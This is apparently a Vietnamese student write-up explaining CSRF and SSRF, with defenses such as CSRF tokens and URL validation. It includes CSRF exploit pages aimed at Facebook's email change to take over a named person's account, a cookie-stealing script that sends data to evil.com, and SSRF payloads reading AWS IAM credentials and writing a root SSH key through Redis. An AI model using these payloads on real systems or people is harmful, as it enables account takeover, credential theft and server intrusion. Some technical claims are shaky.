# CSRF & SSRF

## 📑 Mục lục

- [1. Lý thuyết](#1-lý-thuyết)  
  - [Hiểu lỗ hổng CSRF](#hiểu-lỗ-hổng-csrf)  
  - [Hiểu lỗ hổng SSRF](#hiểu-lỗ-hổng-ssrf)  

- [2. Thực hành](#2-thực-hành)  
  - [2.1 Vượt qua các thử thách](#21-vượt-qua-các-thử-thách)  
    - [CSRF](#csrf)  
    - [SSRF](#ssrf)  
  - [2.2 Lỗi CSRF trong website ở challenge trước](#22-lỗi-csrf-trong-website-ở-challenge-trước)

# 1. Lý thuyết

## **Hiểu lỗ hổng CSRF**

### 1. Khái niệm lỗ hổng CSRF

**CSRF (_Cross-Site Request Forgery_)** là một lỗ hổng bảo mật cho phép kẻ tấn công thực hiện các hành động trái phép trên một trang web thay mặt cho người dùng mà không có sự đồng ý của họ. Lỗ hổng này khai thác việc người dùng đã đăng nhập và trình duyệt tự động gửi cookie xác thực khi thực hiện yêu cầu.

### 2. Cách kiểm tra chức năng đổi email của Facebook có bị lỗi CSRF hay không

Để kiểm tra xem chức năng đổi email trên Facebook có bị lỗi CSRF hay không, bạn có thể thực hiện các bước sau:

##### Bước 1: Phân tích yêu cầu đổi email trên Facebook

- Đăng nhập vào Facebook.
- Truy cập phần cài đặt tài khoản → Thay đổi email.
- Sử dụng **DevTools (F12) → Network** để xem yêu cầu gửi đi.
- Tìm HTTP request được gửi đến máy chủ khi thay đổi email, thường là **POST request** đến một URL như:
```js
POST https://www.facebook.com/settings/email
```

- Xem các tham số trong request, đặc biệt kiểm tra xem có **CSRF token (ví dụ: `fb_dtsg` hoặc `csrf_token`)** hay không.

##### Bước 2: Tạo trang web thử nghiệm để kiểm tra CSRF

Nếu trong request không có token CSRF hoặc token không được kiểm tra chặt chẽ, bạn có thể tạo một trang HTML thử nghiệm như sau:

```js
<html>
  <body>
    <form action="https://www.facebook.com/settings/email" method="POST">
      <input type="hidden" name="new_email" value="hacker@example.com">
      <input type="submit" value="Submit">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

##### Bước 3: Mở trang này trong trình duyệt (trong khi vẫn đăng nhập Facebook)

- Nếu email bị thay đổi mà không yêu cầu nhập mật khẩu hoặc xác thực CSRF, thì Facebook có lỗ hổng CSRF.
- Nếu Facebook yêu cầu xác nhận mật khẩu hoặc sử dụng **CSRF token**, thì hệ thống đã có cơ chế phòng chống.

### 3. Website [www.dantri.com.vn](http://www.dantri.com.vn) có thể có lỗ hổng CSRF không?

Câu trả lời của tôi là **Không.**

##### **Giải thích :** 

Tấn công **CSRF (Cross-Site Request Forgery)** xảy ra khi một kẻ tấn công **lợi dụng phiên đăng nhập hợp lệ của người dùng** để thực hiện các hành động trái phép trên website mà không cần sự đồng ý của họ.

- **Website phải có chức năng yêu cầu xác thực người dùng (Login/Session/Cookie).**
    - CSRF khai thác **cookie phiên đăng nhập** của người dùng để thực hiện hành động mà họ không mong muốn.
- **Website phải có các chức năng thay đổi dữ liệu hoặc thực hiện hành động (POST, DELETE, UPDATE).**
    - Ví dụ: đổi mật khẩu, thực hiện giao dịch ngân hàng, đăng bài viết, xóa dữ liệu, v.v.

##### **Tại sao một trang tin tức như Dantri.com.vn khó có lỗ hổng CSRF?**

-  **Không yêu cầu đăng nhập:** Người dùng chỉ vào đọc tin tức, không có **tài khoản cá nhân** hay **chức năng thay đổi dữ liệu**.  
-  **Không có hành động nhạy cảm:** Các trang tin tức chủ yếu sử dụng **yêu cầu GET**, không có form để thay đổi dữ liệu người dùng.  
 - **Không lưu trạng thái phiên người dùng:** Do không có đăng nhập, nên không có **cookie phiên** để CSRF khai thác.


### 4. Một endpoint dùng session id qua header X-SESSION-ID có thể bị lỗ hổng CSRF không?

Không thể nhận được CSRF theo cách thông thường.

##### **Tại sao endpoint này KHÔNG dễ dàng nhận được CSRF?**

1. **Không sử dụng cookie để duy trì phiên bản**

- CSRF thường có lợi cho **trình duyệt tự động gửi cookie** khi thực hiện yêu cầu.
- Nhưng ở đây, **X-SESSION-ID đã được truyền qua tiêu đề** và **trình duyệt không tự động gửi tiêu đề này** khi tải trang từ trang web độc hại.

2. **Kẻ tấn công không thể lấy X-SESSION-ID của nạn nhân**

- Do **Same-Origin Policy (SOP)** , JavaScript chạy trên trang web độc hại **không thể đọc hoặc lấy X-SESSION-ID** từ `victim.com`.
- Kẻ tấn công cần một cách khác để lấy ID phiên (VD: XSS, keylogger, phần mềm độc hại).

3. **Trình duyệt không thể gửi yêu cầu có X-SESSION-ID**

- Nếu một trang độc hại cố gắng gửi yêu cầu đến `victim.com`, trình duyệt **không tự động phân bổ X-SESSION-ID** vào tiêu đề như cookie.
- CORS cũng có thể chặn các yêu cầu có nguồn gốc chéo nếu cấu hình không hợp lệ.

##### **Khi nào điểm cuối này có thể bị tấn công?**

**Không có CSRF, nhưng có thể nhận được các công thức tấn công khác như:**  
- **Session Hijacking (cướp phiên bản** ) nếu X-SESSION-ID hiển thị qua XSS, phần mềm độc hại hoặc lỗi nhật ký.  
- **Cấu hình sai CORS** : Nếu máy chủ `victim.com`cho phép yêu cầu từ mọi nguồn ( `Access-Control-Allow-Origin: *`), kẻ tấn công có thể gửi yêu cầu và đọc phản hồi.  
- **Rò rỉ liên kết giới thiệu** : Nếu X-SESSION-ID được gửi trong URL thay vì tiêu đề, nó có thể hiển thị qua tiêu đề `Referer`.

### 5. Endpoint đổi email gọi api lên server và truyền dữ liệu theo kiểu json. Endpoint này có thể bị lỗ hổng CSRF không?

Endpoint này **có** thể bị lỗ hổng CSRF nếu không có biện pháp bảo vệ.

🔹 **Cách thức tấn công CSRF vào API `/change-email`**:

1. **Nạn nhân đã đăng nhập vào `www.victim.com`**, trình duyệt lưu **cookie phiên (`PHPSESSIONID`)**.
2. **Kẻ tấn công gửi một trang web/email có chứa mã độc**, dụ nạn nhân mở.
3. **Mã độc tự động gửi request đến server nạn nhân bằng cookie hợp lệ**, khiến server xử lý thay đổi email mà nạn nhân không hay biết.

Ví dụ, nếu nạn nhân truy cập vào trang web của kẻ tấn công, đoạn JavaScript sau có thể chạy:
```js
<script>
  fetch("https://www.victim.com/change-email", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({"new-email": "attacker@gmail.com"})
  });
</script>
```
**Khi nạn nhân mở trang web trên, trình duyệt sẽ tự động gửi request với cookie hợp lệ (`PHPSESSIONID`), khiến email bị thay đổi mà nạn nhân không hay biết.**

### 6. Kịch bản tấn công (có kèm theo payload, url exploit) để chiếm tài khoản của Quảng Hải.

##### **Kịch bản tấn công**

1. **Quảng Hải đã đăng nhập vào Facebook**, trình duyệt của anh ta lưu **cookie phiên hợp lệ (`FBSESSIONID`)**.
2. **Kẻ tấn công gửi cho Quảng Hải một email hoặc link chứa mã độc CSRF**.
3. **Khi Quảng Hải truy cập trang độc hại**, trình duyệt tự động gửi request đổi email **mà không cần xác thực**, sử dụng cookie phiên hợp lệ của Quảng Hải.
4. **Facebook cập nhật email của tài khoản Quảng Hải thành email của kẻ tấn công**.
5. **Kẻ tấn công dùng tính năng "Quên mật khẩu" để reset mật khẩu và kiểm soát hoàn toàn tài khoản của Quảng Hải.**

##### **Payload tấn công (HTML exploit)**

Kẻ tấn công có thể gửi cho Quảng Hải một email hoặc link dẫn đến **trang web độc hại** chứa đoạn mã sau:
```js
<!DOCTYPE html>
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://www.facebook.com/change-email" method="POST">
      <input type="hidden" name="new-email" value="attacker@gmail.com">
    </form>
  </body>
</html>
```

Khi Quảng Hải mở trang này, trình duyệt tự động gửi request đổi email mà anh ta không hề hay biết!

##### **URL exploit (nếu API hỗ trợ GET request)**

Nếu Facebook xử lý đổi email qua phương thức `GET`, kẻ tấn công có thể tạo một URL như sau và dụ Quảng Hải bấm vào:
```js
https://www.facebook.com/change-email?new-email=attacker@gmail.com
```
Khi Quảng Hải bấm vào link này, trình duyệt sẽ gửi request với cookie hợp lệ, đổi email thành của kẻ tấn công.

### 7. Cài đặt CSRF Token an toàn để chống lỗi CSRF

##### **1. CSRF Token là gì?**

CSRF Token là một **chuỗi ngẫu nhiên duy nhất**, được tạo ra trên server và gửi đến client, sau đó client phải gửi lại token này trong mỗi request quan trọng (**POST, PUT, DELETE**). Nếu request không có hoặc có token không hợp lệ, server sẽ từ chối xử lý.

##### **2. Cách cài đặt CSRF Token an toàn**

##### **Bước 1: Server tạo CSRF Token**

- Khi người dùng đăng nhập, server sẽ **tạo một CSRF Token ngẫu nhiên** và gửi nó đến trình duyệt.
- Token này có thể được lưu trong **session server-side** hoặc được **gửi qua cookie HTTP-Only**.
- Token phải là **một chuỗi ngẫu nhiên đủ dài** để tránh bị đoán.

Ví dụ tạo token trong Flask (Python):
```js
import secrets

def generate_csrf_token():
    return secrets.token_hex(32)  # Tạo chuỗi ngẫu nhiên 32 bytes
```

Lưu token vào session khi user đăng nhập:
```js
from flask import session

session['csrf_token'] = generate_csrf_token()
```

##### **Bước 2: Gửi CSRF Token đến client**

Có hai cách chính để gửi CSRF Token đến client:

1. **Gửi trong Cookie (Secure & HTTPOnly)**
    
    - Cookie này có thể **không bị truy cập bởi JavaScript** để tránh tấn công XSS.
    - Cookie phải có cờ **SameSite=Strict** để tránh bị gửi kèm khi truy cập từ trang web khác.
    
    Ví dụ trong Flask:
```js
from flask import make_response

response = make_response("Login successful")
response.set_cookie("csrf_token", session['csrf_token'], httponly=True, secure=True, samesite="Strict")
```
2. **Gửi trong HTML form ẩn**

- Khi render form, token sẽ được nhúng vào input hidden.
```js
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
    <input type="text" name="amount">
    <button type="submit">Transfer</button>
</form>
```
##### **Bước 3: Xác thực CSRF Token khi nhận request từ client**

Khi nhận request, server sẽ kiểm tra xem token trong request có khớp với token trong **session hoặc cookie** không. Nếu không, request bị từ chối.

Ví dụ kiểm tra CSRF Token trong Flask:
```js
from flask import request, abort

def validate_csrf_token():
    token_from_request = request.form.get("csrf_token")  # Lấy token từ form
    token_from_session = session.get("csrf_token")  # Lấy token từ session

    if not token_from_request or token_from_request != token_from_session:
        abort(403)  # Từ chối truy cập nếu token không hợp lệ
```

### 8. CSRF Token cài đặt như sau: Server sinh ra một csrf token ngẫu nhiên, sau đó set vào cookie csrfValue. Khi gửi request, client gửi đồng thời csrfValue ở cookie và csrf ở post data. Server trước khi xử lý đổi email, kiểm tra csrf có giống csrfValue không; nếu không giống thì reject. Cơ chế này có an toàn không?

**Không an toàn!** Vì nó có thể bị tấn công **Cross-Site Scripting (XSS)** để đánh cắp CSRF Token.

##### **Phân tích chi tiết**

##### **1. Cách hoạt động của cơ chế này**

- Server **tạo CSRF Token ngẫu nhiên** và lưu nó vào cookie `csrfValue`.
- Khi client gửi request **POST /change-email**, nó sẽ:
    - Gửi `csrfValue` trong cookie.
    - Gửi token `csrf` trong phần **body của request**.
- Server kiểm tra nếu `csrf` (POST data) **giống** `csrfValue` (cookie) thì cho phép đổi email.

##### **2. Điểm yếu của cơ chế này**

**Dễ bị khai thác nếu trang web có lỗ hổng XSS.**

- Vì **CSRF Token được lưu trong cookie**, nếu trang có **lỗ hổng XSS**, kẻ tấn công có thể chạy JavaScript như sau để lấy token:
```js
document.cookie;
```

Ví dụ, nếu trang có một lỗ hổng XSS:
```js
<script>
    fetch("https://evil.com/steal?token=" + document.cookie);
</script>
```
Kẻ tấn công có thể lấy được `csrfValue` và sau đó gửi request hợp lệ để đổi email.  
**CSRF Token bị vô hiệu hóa vì kẻ tấn công có thể truy cập nó.**
    
- **Cookie không có cờ `HttpOnly`**
    
    - `HttpOnly` ngăn JavaScript truy cập cookie, nhưng ở đây `csrfValue` không có `HttpOnly`.
    - Điều này khiến nó dễ bị đánh cắp qua XSS.

- **Không có cơ chế ràng buộc token với session**
    
    - CSRF Token nên được **ràng buộc với session của user**, nhưng ở đây token không liên kết với session.
    - Một attacker có thể **dự đoán hoặc sử dụng lại token từ session khác**.

### 9. Ý nghĩa thuộc tính SameSite=lax của một cookie

##### **1️.SameSite là gì?**

`SameSite` là thuộc tính của cookie giúp kiểm soát **khi nào cookie được gửi trong các yêu cầu HTTP giữa các trang web khác nhau (cross-site requests)**. Nó có 3 giá trị chính:

- `Strict`: Cookie chỉ được gửi khi người dùng truy cập trang web trực tiếp (không gửi trong yêu cầu từ trang web khác).
- `Lax`: Cookie **được gửi trong yêu cầu điều hướng GET từ trang khác** nhưng **không gửi trong yêu cầu POST, PUT, DELETE, AJAX**.
- `None`: Cookie được gửi trong mọi yêu cầu, nhưng bắt buộc phải có `Secure` (HTTPS).

##### **2️. Ý nghĩa của `SameSite=Lax`**

Khi cookie có thuộc tính `SameSite=Lax`, trình duyệt **chỉ gửi cookie trong một số trường hợp nhất định**:  
**Có gửi cookie khi điều hướng GET từ trang khác**, ví dụ:

- Người dùng **bấm vào link** từ `facebook.com` để mở `example.com`.
- Người dùng **nhập URL trực tiếp** vào trình duyệt.

**Không gửi cookie khi yêu cầu đến từ trang khác bằng các phương thức không an toàn như:**

- **POST** (ví dụ: gửi form tự động từ `malicious.com` đến `example.com`).
- **AJAX/fetch từ trang khác** (ví dụ: kẻ tấn công dùng JavaScript gửi request đến `example.com`).
- **Image, iframe, script request** từ trang khác.

##### **3. Xây dựng Lad**

Xây dựng trang web [https://test.victim.com:8443/test/samesite.html](https://test.victim.com:8443/test/samesite.html). Khi truy cập trang web sẽ tạo ra các cookie 

![1](https://github.com/user-attachments/assets/8b78457b-e8c3-4b16-a9ed-ae34855460fc)

Dựng trang web [https://attacker.com/samesite.html](http://attacker.com/samesite.html) có nội dung như sau:
```js
<html>
<head>
<script type="text/javascript">
      function sendrequest(method, url){
            let xhr = new XMLHttpRequest();
            xhr.open(method, url);
            if (method == 'POST')
                  xhr.send("test=test");
            else
                  xhr.send();
            xhr.onerror = function() {
              console.log("Request failed");
            };
      }
      window.onload = function(){
            let url = "https://test.victim.com:8443/";
            document.getElementById("getbtn").addEventListener("click", function(event){
                  sendrequest("GET", url);
            })
            document.getElementById("postbtn").addEventListener("click", function(event){
                  sendrequest("POST", url);
            })
      }
</script>
</head>
<body>
      <a href="https://test.victim.com:8443/" target="_blank">Open in new Tab</a><br>
      <form method="POST" action="https://test.victim.com:8443/" target="_blank">
            <input type="Submit" value="Post in new Tab" >
      </form>
      <button id="getbtn">GET with XMLHttpRequest</button><br>
      <button id="postbtn">POST with XMLHttpRequest</button>
</body>
```

![2](https://github.com/user-attachments/assets/6dbcefdb-12e0-4c25-a741-e045f51acce8)


##### **Trả lời các câu hỏi:**

●  Click vào link “Open in new tab” thì những cookie nào được gửi?

**Cả 3 cookie đều được gửi**

![3](https://github.com/user-attachments/assets/1a5be2ad-cbc9-4f1e-b5d5-c62a375776a0)

●  Click vào button “Post in new tab” thì những cookie nào được gửi?

**Cả 3 cookie đều được gửi**

![4](https://github.com/user-attachments/assets/3db35e0b-1c64-49e3-89a7-1316fcff2866)


●  Click vào button “GET with XMLHttpRequest” thì những cookie nào được gửi?

**Không có cookie nào được gửi, trừ khi CORS cho phép + withCredentials=true.**

●  Click vào button “POST with XMLHttpRequest” thì những cookie nào được gửi?

**Không có cookie nào được gửi, trừ khi CORS cho phép + withCredentials=true.**

## **Hiểu lỗ hổng SSRF**

### 1. Lỗ hổng SSRF
##### 1.1 Khái niệm lỗ hổng SSRF (Server-Side Request Forgery)
SSRF (Server-Side Request Forgery – Giả mạo yêu cầu phía máy chủ) là một lỗ hổng bảo mật trong đó kẻ tấn công có thể buộc máy chủ ứng dụng gửi yêu cầu đến một địa chỉ mà chúng kiểm soát hoặc đến các hệ thống nội bộ không được truy cập trực tiếp từ bên ngoài.

**Nguyên nhân:**

- Ứng dụng cho phép người dùng nhập URL hoặc địa chỉ để tải tài nguyên mà không có kiểm tra hợp lệ.
- Máy chủ không giới hạn các yêu cầu HTTP được gửi đi, dẫn đến việc tấn công các hệ thống nội bộ hoặc dị

**Hậu quả:**

- **Truy cập trái phép vào mạng nội bộ:** Kẻ tấn công có thể quét mạng nội bộ, truy cập các dịch vụ nội bộ như cơ sở dữ liệu, Redis, Elasticsearch...
- **Lạm dụng các API nội bộ:** Nếu máy chủ có API nội bộ (như AWS metadata service), kẻ tấn công có thể truy xuất thông tin nhạy cảm.
- **Tấn công từ chối dịch vụ (DoS):** Nếu SSRF có thể gửi nhiều yêu cầu đến một dịch vụ cụ thể, nó có thể gây quá tải hệ thống.

##### 2. Blind SSRF là gì?

Blind SSRF (SSRF mù) là một biến thể của SSRF, trong đó kẻ tấn công không thể nhìn thấy phản hồi trực tiếp từ máy chủ. Thay vào đó, chúng có thể xác định xem cuộc tấn công thành công hay không bằng các dấu hiệu gián tiếp, như:

- **Kiểm tra thời gian phản hồi**: Nếu thời gian phản hồi chậm hơn bình thường, có thể yêu cầu đã được xử lý.
- **Dựa vào phản hồi lỗi**: Một số ứng dụng có thể trả về mã lỗi khác nhau tùy thuộc vào tài nguyên có tồn tại hay không.
- **Gửi yêu cầu đến dịch vụ bên ngoài (Out-of-Band - OOB)**: Nếu yêu cầu từ máy chủ ứng dụng đến một endpoint do kẻ tấn công kiểm soát (ví dụ: webhook hoặc DNS logging), chúng có thể phát hiện SSRF.

Blind SSRF nguy hiểm hơn vì khó phát hiện và khai thác hiệu quả nhưng vẫn có thể giúp kẻ tấn công dò quét mạng nội bộ hoặc đánh cắp dữ liệu.

##### 3. Sự khác nhau giữa CSRF và SSRF

|Tiêu chí|CSRF (Cross-Site Request Forgery)|SSRF (Server-Side Request Forgery)|
|---|---|---|
|**Bản chất**|Lừa người dùng gửi yêu cầu trái phép từ trình duyệt của họ.|Lừa máy chủ gửi yêu cầu đến địa chỉ mà kẻ tấn công kiểm soát.|
|**Chủ thể bị lợi dụng**|Trình duyệt của người dùng (Client-side).|Máy chủ ứng dụng (Server-side).|
|**Hướng tấn công**|Tấn công vào ứng dụng web và tài khoản người dùng.|Tấn công vào hệ thống backend hoặc dịch vụ nội bộ.|
|**Cách khai thác**|Kẻ tấn công nhúng yêu cầu vào trang web độc hại để người dùng vô tình thực hiện.|Kẻ tấn công cung cấp một URL độc hại để máy chủ truy cập.|
|**Hậu quả**|Đánh cắp thông tin, thay đổi dữ liệu của người dùng mà không có sự đồng ý.|Truy cập trái phép vào mạng nội bộ, lấy dữ liệu nhạy cảm hoặc thực hiện DoS.|

### 2. Lỗ hổng SSRF thường xảy ra ở những chức năng nào? Trình bày 3 ví dụ chức năng thực tế mà em nghĩ có thể bị lỗ hổng SSRF

##### **2.1 Lỗ hổng SSRF thường xảy ra ở những chức năng nào?**

SSRF thường xuất hiện ở các chức năng trong ứng dụng web cho phép người dùng nhập URL và máy chủ sẽ thực hiện yêu cầu HTTP đến URL đó. Những chức năng này có thể vô tình cho phép kẻ tấn công lợi dụng để gửi yêu cầu đến hệ thống nội bộ hoặc các dịch vụ nhạy cảm.

##### Các chức năng phổ biến dễ bị SSRF:

- **Chức năng tải ảnh (Image Fetching):** Hệ thống lấy ảnh từ URL mà người dùng cung cấp.
- **Webhooks và API Callback:** Ứng dụng gọi URL do người dùng chỉ định để gửi hoặc nhận dữ liệu.
- **Chức năng kiểm tra trạng thái URL (URL Preview, Website Metadata Fetcher):** Hệ thống gửi yêu cầu đến một URL để lấy tiêu đề trang hoặc thông tin metadata.

##### 2.2 Ba ví dụ thực tế về chức năng có thể bị SSRF

**Ví dụ 1: Hệ thống tải ảnh từ URL**

📌 **Chức năng:** Người dùng nhập URL hình ảnh và hệ thống tải ảnh từ URL đó.  

📌 **Lỗ hổng:** Nếu không có kiểm tra hợp lệ, kẻ tấn công có thể nhập URL nội bộ như:
```js
http://127.0.0.1:8080/admin  
http://169.254.169.254/latest/meta-data/  
```

📌 **Tác hại:**
- Đọc dữ liệu từ các dịch vụ nội bộ, chẳng hạn như AWS metadata service.
- Truy cập API admin hoặc trang quản trị nội bộ.

✅ **Cách phòng chống:**
- Chỉ cho phép tải ảnh từ danh sách domain hợp lệ.
- Kiểm tra phản hồi để tránh tải dữ liệu ngoài mong muốn.
- Sử dụng máy chủ proxy an toàn thay vì cho phép truy cập trực tiếp.

**🔹 Ví dụ 2: Webhooks hoặc API Callback**

📌 **Chức năng:** Một ứng dụng cho phép người dùng nhập URL webhook để nhận thông báo khi có sự kiện mới.  

📌 **Lỗ hổng:** Kẻ tấn công có thể nhập URL nội bộ để máy chủ gửi yêu cầu đến một dịch vụ backend không được bảo vệ, ví dụ:
```js
http://localhost:9200/_cluster/health  (truy vấn thông tin Elasticsearch)  
http://internal-service.local/status  (kiểm tra trạng thái dịch vụ nội bộ)  
```

📌 **Tác hại:**

- Gửi yêu cầu đến dịch vụ backend, làm lộ thông tin nội bộ.
- Có thể thực hiện các lệnh nguy hiểm trên dịch vụ nếu không có xác thực.

✅ **Cách phòng chống:**

- Hạn chế danh sách domain được phép sử dụng webhook.
- Kiểm tra phản hồi HTTP để phát hiện truy cập bất thường.
- Không cho phép gọi các địa chỉ `localhost`, `127.0.0.1`, `internal` hoặc dải IP nội bộ.

#### **🔹 Ví dụ 3: Chức năng xem trước URL (URL Preview)**

📌 **Chức năng:** Một trang web có tính năng nhập URL để hiển thị tiêu đề trang hoặc hình ảnh đại diện (giống như khi chia sẻ link trên mạng xã hội).  

📌 **Lỗ hổng:** Nếu hệ thống không kiểm tra đầu vào, kẻ tấn công có thể nhập URL như:
```js
http://localhost:3306/  (truy cập MySQL nội bộ)  
http://internal-service/api/  (truy cập API nội bộ)  
```

📌 **Tác hại:**

- Lộ thông tin về dịch vụ nội bộ (database, API).
- Có thể sử dụng để tấn công từ chối dịch vụ (DoS).

✅ **Cách phòng chống:**

- Chỉ cho phép xem trước URL từ danh sách domain hợp lệ.
- Giới hạn loại nội dung có thể truy xuất (chỉ cho phép HTTP/HTTPS).
- Không cho phép truy cập IP nội bộ (`10.x.x.x`, `192.168.x.x`).

### 3. Giả sử Facebook có chức năng upload ảnh avatar từ url

##### **3.1 Cách kiểm tra xem chức năng upload avatar có bị lỗi SSRF không**

Chúng ta có thể kiểm tra lỗ hổng SSRF bằng cách thử gửi các yêu cầu đến các địa chỉ IP hoặc dịch vụ nội bộ để quan sát phản hồi của hệ thống. Các bước kiểm tra như sau:

##### Bước 1: Kiểm tra phản hồi của hệ thống khi nhập URL tùy chỉnh

Thử gửi yêu cầu với URL hợp lệ và không hợp lệ để xem phản hồi của hệ thống:

- **URL hợp lệ (hình ảnh bình thường):**
```js
https://www.facebook.com/upload-avatar?url=https://gravatar.com/avatar.jpg
```

Kỳ vọng: Hệ thống lưu ảnh bình thường.

- **URL không hợp lệ (file không phải ảnh):**
```js
https://www.facebook.com/upload-avatar?url=https://example.com/file.txt
```

Kỳ vọng: Hệ thống hiển thị lỗi "Không phải là file ảnh".

- **Thử truy cập dịch vụ nội bộ**
```js
https://www.facebook.com/upload-avatar?url=http://127.0.0.1:80
```

Nếu hệ thống trả về lỗi hoặc phản hồi khác thường, có thể tồn tại SSRF.

##### Bước 2: Thử truy cập các dải IP nội bộ

Gửi yêu cầu đến các dải IP nội bộ phổ biến:

- Truy cập dịch vụ trên localhost:
```js
https://www.facebook.com/upload-avatar?url=http://127.0.0.1:8080
```

- Thử truy cập metadata AWS (nếu server chạy trên AWS):
```js
https://www.facebook.com/upload-avatar?url=http://169.254.169.254/latest/meta-data/
```

Nếu nhận được phản hồi từ AWS metadata, có khả năng hệ thống dễ bị khai thác.

##### Bước 3: Kiểm tra bằng DNS Logging để xác nhận Blind SSRF

Nếu hệ thống không hiển thị phản hồi rõ ràng, ta có thể thử gửi yêu cầu đến một server DNS do ta kiểm soát:
```js
https://www.facebook.com/upload-avatar?url=http://evil.com
```

Nếu DNS server ghi nhận request từ Facebook, chứng tỏ có SSRF Blind.

##### **2. Khai thác lỗ hổng SSRF trong các tình huống cụ thể**

**Trường hợp 1: Server chạy trên máy ảo EC2 của AWS**

- **Amazon EC2 (Elastic Compute Cloud)** là một dịch vụ **máy ảo trên đám mây** của AWS, giúp bạn tạo và quản lý các server ảo (instance) để chạy ứng dụng, website, hoặc dịch vụ backend.

- **Hiểu đơn giản**: EC2 giống như một máy tính ảo chạy trên AWS, bạn có thể cài hệ điều hành (Windows/Linux), triển khai ứng dụng và mở rộng theo nhu cầu.

**Khai thác:**

- Nếu SSRF tồn tại, ta có thể truy cập AWS metadata service:
```js
https://www.facebook.com/upload-avatar?url=http://169.254.169.254/latest/meta-data/
```

- Nếu hệ thống không chặn response, ta có thể lấy các thông tin quan trọng:

```js
https://www.facebook.com/upload-avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

- Nếu thành công, ta sẽ lấy được **IAM Role Credentials**, từ đó có thể sử dụng quyền này để truy cập S3, RDS, hoặc các dịch vụ khác trên AWS.

Tấn công thành công nếu hệ thống không có biện pháp chặn truy cập metadata AWS.

**Trường hợp 2: Server chạy Redis với quyền root, không bật xác thực và lắng nghe ở `127.0.0.1:6379`**

- **Redis (Remote Dictionary Server)** là một **cơ sở dữ liệu NoSQL dạng key-value**, thường được sử dụng làm **bộ nhớ đệm (cache), message broker hoặc database** với hiệu suất rất cao. Redis lưu trữ dữ liệu **trong RAM**, giúp truy xuất dữ liệu nhanh hơn so với các hệ quản trị cơ sở dữ liệu truyền thống như MySQL hoặc PostgreSQL.

 - **Hiểu đơn giản**: Redis giống như một "sổ tay siêu tốc" lưu dữ liệu tạm thời trong bộ nhớ RAM, giúp tăng tốc truy xuất dữ liệu.

**Khai thác:**

- Kiểm tra xem có thể gửi lệnh đến Redis bằng SSRF hay không:
```js
https://www.facebook.com/upload-avatar?url=http://127.0.0.1:6379/
```

Nếu có SSRF, yêu cầu này có thể gửi dữ liệu đến Redis.

- Thử ghi key vào Redis để tạo backdoor:
```js
https://www.facebook.com/upload-avatar?url=http://127.0.0.1:6379/SET mykey "hacked"
```

Nếu thành công, chứng tỏ ta có thể thao tác với Redis.

- Thêm SSH Key vào Redis để truy cập server:
```js
https://www.facebook.com/upload-avatar?url=http://127.0.0.1:6379/CONFIG SET dir /root/.ssh/
https://www.facebook.com/upload-avatar?url=http://127.0.0.1:6379/CONFIG SET dbfilename "authorized_keys"
https://www.facebook.com/upload-avatar?url=http://127.0.0.1:6379/SET 1 "ssh-rsa AAAAB3NzaC1yc2EAAAABIw..."
https://www.facebook.com/upload-avatar?url=http://127.0.0.1:6379/SAVE
```

Nếu thành công, kẻ tấn công có thể SSH vào server với quyền root.

Tấn công thành công nếu Redis không có xác thực và có thể truy cập qua SSRF.

**Trường hợp 3: Redis không bật xác thực, nhưng chạy trên một server khác trong mạng nội bộ**

Nếu Redis chạy trên một máy chủ **không phải localhost**, nhưng nằm trong **mạng nội bộ**, thì có thể có các rủi ro sau:

- **Bất kỳ máy nào trong mạng nội bộ** đều có thể kết nối đến Redis mà không cần xác thực.
- **Nếu mạng nội bộ bị xâm nhập** (ví dụ hacker có quyền truy cập vào một máy khác trong cùng mạng), hacker có thể:
    - Đọc dữ liệu từ Redis (chứa session, token, cache, v.v.).
    - Xóa toàn bộ dữ liệu bằng lệnh `FLUSHALL`.
    - Chèn mã độc hoặc cấu hình nguy hiểm.

**Khai thác:**

- Kiểm tra xem hệ thống có thể quét mạng nội bộ:
```js
https://www.facebook.com/upload-avatar?url=http://192.168.1.100:6379/
```

Nếu nhận được phản hồi khác với URL bình thường, có thể Redis tồn tại trong mạng.
    
- Nếu hệ thống hỗ trợ HTTP Redirect, ta có thể thử gửi lệnh đến Redis bằng HTTP payload:
```js
https://www.facebook.com/upload-avatar?url=http://192.168.1.100:6379/SET mykey "hacked"
```

- Nếu thành công, ta có thể thực hiện các lệnh Redis từ xa như trong **Trường hợp 2**.

Tấn công thành công nếu SSRF cho phép truy cập mạng nội bộ và Redis không có xác thực.

### 4. Các phòng tránh SSRF

##### **Cách 1: Kiểm tra chặt chẽ tham số URL đầu vào**

##### **Ưu điểm:**

- **Dễ triển khai**: Có thể kiểm soát ngay từ ứng dụng chính mà không cần thay đổi hệ thống backend hoặc các dịch vụ nội bộ.  
- **Chặn từ gốc**: Nếu triển khai tốt, có thể ngăn chặn các yêu cầu độc hại trước khi chúng đến được các dịch vụ nội bộ.  
- **Bảo vệ tổng quát**: Có thể áp dụng nhiều phương pháp như danh sách trắng (whitelist), kiểm tra regex, cấm truy cập IP nội bộ (`127.0.0.1`, `169.254.0.0/16`, `10.0.0.0/8`, `192.168.0.0/16`, v.v.).

##### **Nhược điểm:**

- **Có thể bị bypass**: Nếu kiểm tra không chặt chẽ, hacker có thể sử dụng các kỹ thuật như DNS rebinding, HTTP redirection, hoặc sử dụng dịch vụ trung gian (proxy) để vượt qua.  
- **Không thể bảo vệ toàn diện**: Nếu ứng dụng có nhiều điểm nhập URL hoặc tải nội dung từ bên ngoài, việc kiểm soát từng điểm có thể phức tạp.

##### **Cách 2: Sửa các dịch vụ internal**

##### **Ưu điểm:**

- **Bảo vệ tận gốc**: Khi tất cả các dịch vụ nội bộ yêu cầu xác thực mạnh, kể cả khi có SSRF thì hacker cũng không thể truy cập được.  

- **Chặn nhiều hình thức tấn công**: Không chỉ chống SSRF, mà còn giúp bảo vệ khỏi các cuộc tấn công khác như unauthorized access, API abuse, v.v.  

- **Giảm rủi ro dài hạn**: Nếu backend an toàn, các lỗ hổng liên quan đến truy cập trái phép cũng giảm đáng kể.

##### **Nhược điểm:**

- **Khó triển khai**: Nếu hệ thống có nhiều dịch vụ cũ (legacy services) không hỗ trợ xác thực mạnh, việc sửa chữa sẽ rất tốn kém.  

- **Ảnh hưởng đến hiệu suất**: Việc yêu cầu xác thực mọi request có thể làm tăng độ trễ và ảnh hưởng đến hiệu suất hệ thống.  

